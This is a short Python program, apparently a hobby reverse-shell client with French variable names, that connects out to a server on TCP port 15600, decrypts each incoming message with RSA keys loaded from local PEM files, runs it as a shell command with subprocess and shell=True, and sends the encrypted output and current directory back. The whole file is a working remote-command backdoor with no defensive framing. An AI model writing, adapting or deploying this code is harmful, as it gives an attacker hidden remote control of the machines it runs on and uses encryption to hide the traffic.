import socket
import os
import subprocess
import sys
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

connexion_avec_server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connexion_avec_server.connect(("",15600))


cipher = None
cipher_clear = None

def key_initialization():
    with open("private.pem", "r") as key_priv:
        priv = key_priv.read()
        key_priv.close()

    with open("public.pem", "r") as key_pub:
        pubc = key_pub.read()
        key_pub.close()
    private_key = RSA.import_key(priv)
    public_key = RSA.import_key(pubc)
    return PKCS1_OAEP.new(public_key),  PKCS1_OAEP.new(private_key)


cipher,cipher_clear = key_initialization()

message = b"hello world"
message = cipher.encrypt(message)
print("message chifferé : ", message)
print("message dechifferé : ", cipher_clear.decrypt(message).decode())
while True :
    data = connexion_avec_server.recv(16384)
    print("data before encryption : ", data)
    data = cipher_clear.decrypt(data)
    #data = cipher.encrypt(data)
    print("data :",data.decode())
    if len(data) > 0:
        if data.decode() == "quit":
            connexion_avec_server.close()
            sys.exit(0)
        if data[:2].decode("utf-8") == "cd":
            os.chdir(data[3:].decode("utf-8"))
            data = "pwd".encode()
        cmd = subprocess.Popen(data.decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                               stdin=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes, "utf-8")
        output_chiffre = str.encode(output_str + os.getcwd() + "> ")
        output_chiffre = cipher.encrypt(output_chiffre)
        connexion_avec_server.send(output_chiffre)
        print("output :",output_str)

